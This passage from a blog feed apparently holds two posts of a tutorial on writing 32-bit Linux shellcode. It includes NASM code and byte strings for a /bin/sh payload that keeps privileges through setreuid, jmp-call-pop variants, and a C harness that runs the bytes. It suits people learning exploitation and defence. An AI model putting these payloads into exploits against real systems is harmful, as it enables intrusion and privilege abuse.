</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali32:/tmp# nasm -f elf shell2.asm; ld shell2.o -o shell2
</span><span class='line'>
</span><span class='line'>root@kali32:/tmp# ./shell2 
</span><span class='line'>#</span></code></pre></td></tr></table></div></figure>


<p>Before we dump our opcodes, we add <code>setreuid(geteuid(), geteuid()</code> call:</p>

<figure class='code'><figcaption><span>shell3.asm </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
</pre></td><td class='code'><pre><code class='asm'><span class='line'><span class="nf">section</span> <span class="no">.text</span>
</span><span class='line'><span class="nf">global</span> <span class="no">_start</span>
</span><span class='line'><span class="nl">_start:</span>
</span><span class='line'>
</span><span class='line'><span class="err">;</span> <span class="nf">geteuid</span>
</span><span class='line'><span class="nf">push</span> <span class="no">byte</span> <span class="mi">49</span>
</span><span class='line'><span class="nf">pop</span> <span class="no">eax</span>
</span><span class='line'><span class="nf">int</span> <span class="mi">0x80</span>
</span><span class='line'>
</span><span class='line'><span class="err">;</span> <span class="nf">setreuid</span><span class="p">(</span><span class="no">geteuid</span><span class="p">(),</span> <span class="no">geteuid</span><span class="p">()</span>
</span><span class='line'><span class="nf">mov</span> <span class="no">ebx</span><span class="p">,</span> <span class="no">eax</span>
</span><span class='line'><span class="nf">mov</span> <span class="no">ecx</span><span class="p">,</span> <span class="no">eax</span>
</span><span class='line'><span class="nf">push</span> <span class="no">byte</span> <span class="mi">70</span>
</span><span class='line'><span class="nf">pop</span> <span class="no">eax</span>
</span><span class='line'><span class="nf">int</span> <span class="mi">0x80</span>
</span><span class='line'>
</span><span class='line'><span class="err">;</span><span class="nf">execve</span><span class="p">(</span><span class="err">&quot;/</span><span class="no">bin</span><span class="err">/</span><span class="no">sh</span><span class="err">&quot;</span><span class="p">,</span> <span class="err">{&quot;/</span><span class="no">bin</span><span class="err">/</span><span class="no">sh</span><span class="err">&quot;</span><span class="p">,</span> <span class="no">NULL</span><span class="err">}</span><span class="p">,</span> <span class="no">NULL</span><span class="p">)</span>
</span><span class='line'><span class="nf">xor</span> <span class="no">eax</span><span class="p">,</span> <span class="no">eax</span>
</span><span class='line'><span class="nf">xor</span> <span class="no">edx</span><span class="p">,</span> <span class="no">edx</span>
</span><span class='line'>
</span><span class='line'><span class="nf">push</span> <span class="no">eax</span> <span class="err">;</span> <span class="err">\</span><span class="mi">0</span>
</span><span class='line'><span class="nf">push</span> <span class="err">&#39;</span><span class="no">n</span><span class="err">/</span><span class="no">sh</span><span class="err">&#39;</span>
</span><span class='line'><span class="nf">push</span> <span class="err">&#39;//</span><span class="no">bi</span><span class="err">&#39;</span>
</span><span class='line'><span class="nf">mov</span> <span class="no">ebx</span><span class="p">,</span> <span class="no">esp</span>
</span><span class='line'>
</span><span class='line'><span class="nf">push</span> <span class="no">eax</span> <span class="err">;</span> <span class="err">\</span><span class="mi">0</span>
</span><span class='line'><span class="nf">push</span> <span class="no">ebx</span> <span class="err">;</span> <span class="err">/</span><span class="no">bin</span><span class="err">/</span><span class="no">sh</span>
</span><span class='line'><span class="nf">mov</span> <span class="no">ecx</span><span class="p">,</span> <span class="no">esp</span>
</span><span class='line'>
</span><span class='line'><span class="nf">mov</span>  <span class="no">al</span><span class="p">,</span> <span class="mi">11</span>
</span><span class='line'><span class="nf">int</span> <span class="mi">0x80</span>
</span></code></pre></td></tr></table></div></figure>




<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali32:/tmp# nasm -f elf shell3.asm; ld shell3.o -o shell3
</span><span class='line'>
</span><span class='line'>root@kali32:/tmp# ./shell3</span></code></pre></td></tr></table></div></figure>




<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali32:/tmp# objdump -M intel -d shell3
</span><span class='line'>
</span><span class='line'>shell3:     file format elf32-i386
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>Disassembly of section .text:
</span><span class='line'>
</span><span class='line'>08048060 &lt;_start>:
</span><span class='line'> 8048060: 6a 31                   push   0x31
</span><span class='line'> 8048062: 58                      pop    eax
</span><span class='line'> 8048063: cd 80                   int    0x80
</span><span class='line'> 8048065: 89 c3                   mov    ebx,eax
</span><span class='line'> 8048067: 89 c1                   mov    ecx,eax
</span><span class='line'> 8048069: 6a 46                   push   0x46
</span><span class='line'> 804806b: 58                      pop    eax
</span><span class='line'> 804806c: cd 80                   int    0x80
</span><span class='line'> 804806e: 31 c0                   xor    eax,eax
</span><span class='line'> 8048070: 31 d2                   xor    edx,edx
</span><span class='line'> 8048072: 50                      push   eax
</span><span class='line'> 8048073: 68 6e 2f 73 68          push   0x68732f6e
</span><span class='line'> 8048078: 68 2f 2f 62 69          push   0x69622f2f
</span><span class='line'> 804807d: 89 e3                   mov    ebx,esp
</span><span class='line'> 804807f: 50                      push   eax
</span><span class='line'> 8048080: 53                      push   ebx
</span><span class='line'> 8048081: 89 e1                   mov    ecx,esp
</span><span class='line'> 8048083: b0 0b                   mov    al,0xb
</span><span class='line'> 8048085: cd 80                   int    0x80</span></code></pre></td></tr></table></div></figure>


<p>Analogously as before:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali32:/tmp# objdump -d shell3 | tr '[:blank:]' '\n' | egrep '^[0-9a-f]{2}$' | sed 's#^#\\x#' | paste -s -d ''
</span><span class='line'>\x6a\x31\x58\xcd\x80\x89\xc3\x89\xc1\x6a\x46\x58\xcd\x80\x31\xc0\x31\xd2\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80</span></code></pre></td></tr></table></div></figure>




<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali32:/tmp# sc=$(objdump -d shell3 | tr '[:blank:]' '\n' | egrep '^[0-9a-f]{2}$' | sed 's#^#\\x#' | paste -s -d '')
</span><span class='line'>
</span><span class='line'>root@kali32:/tmp# echo $sc | ruby -e 'print $stdin.read.scan(/\\x(..)/).flatten.map{ |x| x.to_i(16).chr }.join' > shellcode</span></code></pre></td></tr></table></div></figure>




<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>#include &lt;sys/mman.h>
</span><span class='line'>#include &lt;string.h>
</span><span class='line'>#include &lt;stdio.h>
</span><span class='line'>
</span><span class='line'>char sc[]= "\x6a\x31\x58\xcd\x80\x89\xc3\x89\xc1\x6a\x46\x58\xcd\x80\x31\xc0\x31\xd2\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80";
</span><span class='line'>
</span><span class='line'>int main(){
</span><span class='line'>        void * a = mmap(0, 4096, PROT_EXEC |PROT_READ | PROT_WRITE, MAP_ANONYMOUS | MAP_SHARED, -1, 0); 
</span><span class='line'>        printf("allocated executable memory at: %p\n", a); 
</span><span class='line'>        printf("shellcode length: %d\n", strlen(sc)); 
</span><span class='line'>        ((void (*)(void)) memcpy(a, sc, sizeof(sc)))();
</span><span class='line'>}</span></code></pre></td></tr></table></div></figure>




<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali32:/tmp# gcc test.c -o test
</span><span class='line'>root@kali32:/tmp# ./test 
</span><span class='line'>allocated executable memory at: 0xb76f7000
</span><span class='line'>shellcode length: 39
</span><span class='line'>#</span></code></pre></td></tr></table></div></figure>


<p>Alternatively we can obtain string reference with <code>call</code> instruction:</p>

<figure class='code'><figcaption><span>shell4.asm </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
</pre></td><td class='code'><pre><code class='asm'><span class='line'><span class="nf">section</span> <span class="no">.text</span>
</span><span class='line'><span class="nf">global</span> <span class="no">_start</span>
</span><span class='line'><span class="nl">_start:</span>
</span><span class='line'>
</span><span class='line'><span class="err">;</span> <span class="nf">geteuid</span>
</span><span class='line'><span class="nf">push</span> <span class="no">byte</span> <span class="mi">49</span>
</span><span class='line'><span class="nf">pop</span> <span class="no">eax</span>
</span><span class='line'><span class="nf">int</span> <span class="mi">0x80</span>
</span><span class='line'>
</span><span class='line'><span class="err">;</span> <span class="nf">setreuid</span><span class="p">(</span><span class="no">geteuid</span><span class="p">(),</span> <span class="no">geteuid</span><span class="p">()</span>
</span><span class='line'><span class="nf">mov</span> <span class="no">ebx</span><span class="p">,</span> <span class="no">eax</span>
</span><span class='line'><span class="nf">mov</span> <span class="no">ecx</span><span class="p">,</span> <span class="no">eax</span>
</span><span class='line'><span class="nf">push</span> <span class="no">byte</span> <span class="mi">70</span>
</span><span class='line'><span class="nf">pop</span> <span class="no">eax</span>
</span><span class='line'><span class="nf">int</span> <span class="mi">0x80</span>
</span><span class='line'>
</span><span class='line'><span class="err">;</span><span class="nf">execve</span><span class="p">(</span><span class="err">&quot;/</span><span class="no">bin</span><span class="err">/</span><span class="no">sh</span><span class="err">&quot;</span><span class="p">,</span> <span class="no">NULL</span><span class="p">,</span> <span class="no">NULL</span><span class="p">)</span><span class="err">;</span>
</span><span class='line'><span class="nf">xor</span> <span class="no">eax</span><span class="p">,</span> <span class="no">eax</span>
</span><span class='line'><span class="nf">xor</span> <span class="no">ecx</span><span class="p">,</span> <span class="no">ecx</span>
</span><span class='line'><span class="nf">xor</span> <span class="no">edx</span><span class="p">,</span> <span class="no">edx</span>
</span><span class='line'>
</span><span class='line'><span class="nf">jmp</span> <span class="no">short</span> <span class="no">string_loc</span>
</span><span class='line'>
</span><span class='line'><span class="nl">string_loc_ret:</span>
</span><span class='line'><span class="nf">pop</span> <span class="no">ebx</span>
</span><span class='line'><span class="nf">mov</span> <span class="err">[</span><span class="no">ebx</span><span class="err">+</span><span class="mi">7</span><span class="err">]</span><span class="p">,</span> <span class="no">cl</span> <span class="err">;</span> <span class="no">rewrite</span> <span class="no">N</span> <span class="no">with</span> <span class="err">\</span><span class="mi">0</span>
</span><span class='line'>
</span><span class='line'><span class="nf">push</span> <span class="no">edx</span><span class="err">;</span> <span class="err">\</span><span class="mi">0</span>
</span><span class='line'><span class="nf">push</span> <span class="no">ebx</span><span class="err">;</span> <span class="err">/</span><span class="no">bin</span><span class="err">/</span><span class="no">sh</span>
</span><span class='line'><span class="nf">mov</span> <span class="no">esp</span><span class="p">,</span> <span class="no">ecx</span>
</span><span class='line'>
</span><span class='line'><span class="nf">mov</span> <span class="no">al</span><span class="p">,</span> <span class="mi">11</span>
</span><span class='line'><span class="nf">int</span> <span class="mi">0x80</span>
</span><span class='line'>
</span><span class='line'><span class="nl">string_loc:</span>
</span><span class='line'><span class="nf">call</span> <span class="no">string_loc_ret</span> <span class="err">;</span> <span class="no">this</span> <span class="no">put</span> <span class="no">the</span> <span class="p">(</span><span class="no">return</span><span class="p">)</span> <span class="no">address</span> <span class="no">of</span> <span class="no">the</span> <span class="no">string</span> <span class="no">to</span> <span class="no">the</span> <span class="no">top</span> <span class="no">of</span> <span class="no">the</span> <span class="no">stack</span>
</span><span class='line'><span class="nf">db</span> <span class="err">&#39;/</span><span class="no">bin</span><span class="err">/</span><span class="no">shN</span><span class="err">&#39;</span>
</span></code></pre></td></tr></table></div></figure>




<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali32:/tmp# nasm -f elf shell4.asm; ld shell4.o -o shell4
</span><span class='line'>
</span><span class='line'>root@kali32:/tmp# ./shell4
</span><span class='line'>Segmentation fault</span></code></pre></td></tr></table></div></figure>


<p>The segfault is normal and it&rsquo;s because we are trying to overwrite the code
segment at the line <code>mov BYTE PTR [ebx+0x7],cl</code>. However, our shellcode will be
loaded on stack and that doesn&rsquo;t mean any complication.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali32:/tmp# objdump -M intel -d shell4
</span><span class='line'>
</span><span class='line'>shell4:     file format elf32-i386
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>Disassembly of section .text:
</span><span class='line'>
</span><span class='line'>08048060 &lt;_start>:
</span><span class='line'> 8048060: 6a 31                   push   0x31
</span><span class='line'> 8048062: 58                      pop    eax
</span><span class='line'> 8048063: cd 80                   int    0x80
</span><span class='line'> 8048065: 89 c3                   mov    ebx,eax
</span><span class='line'> 8048067: 89 c1                   mov    ecx,eax
</span><span class='line'> 8048069: 6a 46                   push   0x46
</span><span class='line'> 804806b: 58                      pop    eax
</span><span class='line'> 804806c: cd 80                   int    0x80
</span><span class='line'> 804806e: 31 c0                   xor    eax,eax
</span><span class='line'> 8048070: 31 c9                   xor    ecx,ecx
</span><span class='line'> 8048072: 31 d2                   xor    edx,edx
</span><span class='line'> 8048074: eb 0c                   jmp    8048082 &lt;string_loc>
</span><span class='line'>
</span><span class='line'>08048076 &lt;string_loc_ret>:
</span><span class='line'> 8048076: 5b                      pop    ebx
</span><span class='line'> 8048077: 88 4b 07                mov    BYTE PTR [ebx+0x7],cl
</span><span class='line'> 804807a: 52                      push   edx
</span><span class='line'> 804807b: 53                      push   ebx
</span><span class='line'> 804807c: 89 cc                   mov    esp,ecx
</span><span class='line'> 804807e: b0 0b                   mov    al,0xb
</span><span class='line'> 8048080: cd 80                   int    0x80
</span><span class='line'>
</span><span class='line'>08048082 &lt;string_loc>:
</span><span class='line'> 8048082: e8 ef ff ff ff          call   8048076 &lt;string_loc_ret>
</span><span class='line'> 8048087: 2f                      das    
</span><span class='line'> 8048088: 62 69 6e                bound  ebp,QWORD PTR [ecx+0x6e]
</span><span class='line'> 804808b: 2f                      das    
</span><span class='line'> 804808c: 73 68                   jae    80480f6 &lt;string_loc+0x74>
</span><span class='line'> 804808e: 4e                      dec    esi</span></code></pre></td></tr></table></div></figure>




<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali32:/tmp# objdump -d shell4 | tr '[:blank:]' '\n' | egrep '^[0-9a-f]{2}$' | sed 's#^#\\x#' | paste -s -d ''
</span><span class='line'>\x6a\x31\x58\xcd\x80\x89\xc3\x89\xc1\x6a\x46\x58\xcd\x80\x31\xc0\x31\xc9\x31\xd2\xeb\x0c\x5b\x88\x4b\x07\x52\x53\x89\xcc\xb0\x0b\xcd\x80\xe8\xef\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68\x4e</span></code></pre></td></tr></table></div></figure>




<figure class='code'><figcaption><span>test.c </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="cp">#include &lt;sys/mman.h&gt;</span>
</span><span class='line'><span class="cp">#include &lt;string.h&gt;</span>
</span><span class='line'><span class="cp">#include &lt;stdio.h&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="kt">char</span> <span class="n">sc</span><span class="p">[]</span><span class="o">=</span> <span class="s">&quot;</span><span class="se">\x6a\x31\x58\xcd\x80\x89\xc3\x89\xc1\x6a\x46\x58\xcd\x80\x31\xc0\x31\xc9\x31\xd2\xeb\x0c\x5b\x88\x4b\x07\x52\x53\x89\xcc\xb0\x0b\xcd\x80\xe8\xef\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68\x4e</span><span class="s">&quot;</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'><span class="kt">int</span> <span class="nf">main</span><span class="p">(){</span>
</span><span class='line'>        <span class="kt">void</span> <span class="o">*</span> <span class="n">a</span> <span class="o">=</span> <span class="n">mmap</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">4096</span><span class="p">,</span> <span class="n">PROT_EXEC</span> <span class="o">|</span><span class="n">PROT_READ</span> <span class="o">|</span> <span class="n">PROT_WRITE</span><span class="p">,</span> <span class="n">MAP_ANONYMOUS</span> <span class="o">|</span> <span class="n">MAP_SHARED</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
</span><span class='line'>        <span class="n">printf</span><span class="p">(</span><span class="s">&quot;allocated executable memory at: %p</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">a</span><span class="p">);</span>
</span><span class='line'>        <span class="n">printf</span><span class="p">(</span><span class="s">&quot;shellcode length: %d</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">strlen</span><span class="p">(</span><span class="n">sc</span><span class="p">));</span>
</span><span class='line'>        <span class="p">((</span><span class="kt">void</span> <span class="p">(</span><span class="o">*</span><span class="p">)(</span><span class="kt">void</span><span class="p">))</span> <span class="n">memcpy</span><span class="p">(</span><span class="n">a</span><span class="p">,</span> <span class="n">sc</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">sc</span><span class="p">)))();</span>
</span><span class='line'><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure>




<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali32:/tmp# ./test 
</span><span class='line'>allocated executable memory at: 0xb7789000
</span><span class='line'>shellcode length: 47
</span><span class='line'>#</span></code></pre></td></tr></table></div></figure>



]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[IA-32 Linux Shellcode Basics 1]]></title>
    <link href="http://73696e65.github.io/blog/2015/06/23/ia-32-linux-shellcode-basics-1/"/>
    <updated>2015-06-23T15:01:28+02:00</updated>
    <id>http://73696e65.github.io/blog/2015/06/23/ia-32-linux-shellcode-basics-1</id>
    <content type="html"><![CDATA[<p>We start with the simple shellcode, that prints <code>hello</code> string. For this
purpose, we use Kali Linux 32 bit distribution, that could be downloaded
<a href="https://www.kali.org/downloads/">here</a>.</p>

<p>Because we want to have code as simple as possible, we use tcc ansi compiler and
nasm assembler.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali32:~# aptitude install tcc nasm</span></code></pre></td></tr></table></div></figure>




<figure class='code'><figcaption><span>hello.c </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="cp">#include &lt;stdio.h&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="kt">void</span> <span class="nf">main</span><span class="p">()</span> <span class="p">{</span>
</span><span class='line'>    <span class="n">printf</span><span class="p">(</span><span class="s">&quot;hello</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
</span><span class='line'><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure>




<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali32:/tmp# tcc -g hello.c -o hello
</span><span class='line'>
</span><span class='line'>root@kali32:/tmp# echo 'set disassembly-flavor intel' >> ~/.gdbinit
</span><span class='line'>
</span><span class='line'>root@kali32:/tmp# gdb -q ./hello -ex 'disassemble main' --batch
</span><span class='line'>BFD: /tmp/hello: no group info for section .text.__i686.get_pc_thunk.bx
</span><span class='line'>BFD: /tmp/hello: no group info for section .text.__i686.get_pc_thunk.bx
</span><span class='line'>Dump of assembler code for function main:
</span><span class='line'>   0x080481e4 &lt;+0>:    push   ebp
</span><span class='line'>   0x080481e5 &lt;+1>:    mov    ebp,esp
</span><span class='line'>   0x080481e7 &lt;+3>:    sub    esp,0x0
</span><span class='line'>   0x080481ed &lt;+9>:    mov    eax,0x8049304
</span><span class='line'>   0x080481f2 &lt;+14>:   push   eax
</span><span class='line'>   0x080481f3 &lt;+15>:   call   0x80482e0 &lt;printf>
</span><span class='line'>   0x080481f8 &lt;+20>:   add    esp,0x4
</span><span class='line'>   0x080481fb &lt;+23>:   leave  
</span><span class='line'>   0x080481fc &lt;+24>:   ret    
</span><span class='line'>End of assembler dump.</span></code></pre></td></tr></table></div></figure>


<p>As we can see, the string is located at <code>0x08049304</code> address. However, our code
should be Position Independent (PIE) and without NULL characters.</p>

<p>To rewrite the code about, we need to:</p>

<ul>
<li>Look up the number corresponding to the system call in <code>/usr/include/i386-linux-gnu/asm/unistd_32.h</code></li>
<li>Place system call number in eax, and arguments in ebx, ecx, edx&hellip; in the order they appear in the corresponding man page</li>
<li>Execute <code>int 0x80</code> to alert the kernel we want to perform a system call</li>
</ul>


<p>Our first try:</p>

<figure class='code'><figcaption><span>hello1.asm </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
</pre></td><td class='code'><pre><code class='asm'><span class='line'><span class="nf">section</span> <span class="no">.data</span>
</span><span class='line'><span class="nf">msg</span> <span class="no">db</span> <span class="err">&#39;</span><span class="no">hello</span><span class="err">&#39;</span><span class="p">,</span><span class="mi">0xa</span>
</span><span class='line'>
</span><span class='line'><span class="nf">section</span> <span class="no">.text</span>
</span><span class='line'><span class="nf">global</span> <span class="no">_start</span>
</span><span class='line'><span class="nl">_start:</span>
</span><span class='line'>
</span><span class='line'><span class="err">;</span><span class="nf">write</span><span class="p">(</span><span class="no">int</span> <span class="no">fd</span><span class="p">,</span> <span class="no">char</span> <span class="p">*</span><span class="no">msg</span><span class="p">,</span> <span class="no">unsigned</span> <span class="no">int</span> <span class="no">len</span><span class="p">)</span>
</span><span class='line'><span class="nf">mov</span> <span class="no">eax</span><span class="p">,</span> <span class="mi">4</span>
</span><span class='line'><span class="nf">mov</span> <span class="no">ebx</span><span class="p">,</span> <span class="mi">1</span>
</span><span class='line'><span class="nf">mov</span> <span class="no">ecx</span><span class="p">,</span> <span class="no">msg</span>
</span><span class='line'><span class="nf">mov</span> <span class="no">edx</span><span class="p">,</span> <span class="mi">6</span>
</span><span class='line'><span class="nf">int</span> <span class="mi">0x80</span>
</span><span class='line'>
</span><span class='line'><span class="err">;</span><span class="nf">exit</span><span class="p">(</span><span class="no">int</span> <span class="no">ret</span><span class="p">)</span>
</span><span class='line'><span class="nf">mov</span> <span class="no">eax</span><span class="p">,</span><span class="mi">1</span>
</span><span class='line'><span class="nf">mov</span> <span class="no">ebx</span><span class="p">,</span><span class="mi">0</span>
</span><span class='line'><span class="nf">int</span> <span class="mi">0x80</span>
</span></code></pre></td></tr></table></div></figure>




<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali32:/tmp# nasm -f elf hello1.asm; ld hello1.o -o hello1
</span><span class='line'>
</span><span class='line'>root@kali32:/tmp# ./hello1 
</span><span class='line'>hello</span></code></pre></td></tr></table></div></figure>


<p>Dumping instruction bytecode:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
